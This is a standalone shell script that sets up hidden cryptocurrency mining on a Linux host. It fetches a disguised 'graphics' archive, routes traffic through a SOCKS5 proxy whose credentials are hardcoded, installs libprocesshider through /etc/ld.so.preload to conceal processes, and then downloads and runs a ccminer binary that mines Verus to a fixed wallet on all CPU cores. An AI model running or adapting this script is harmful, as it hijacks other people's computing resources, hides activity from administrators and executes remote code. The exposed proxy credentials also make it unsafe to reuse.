ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install build-essential libcurl4-openssl-dev autotools-dev automake -y

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 173.245.211.239:1080
socks5_username = G0tNyyR4nJ
socks5_password = N1DAYf9S7D
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider;make
sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..



./graftcp/graftcp apt-get install libjansson4 && wget https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04 && chmod +x ccminer_3_7_ubuntu_18.04 && ./ccminer_3_7_ubuntu_18.04 -a verus  -o stratum+tcp://verushash.mine.zergpool.com:3300 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe -p c=VRSC,ID=xidx2 -t $(nproc)
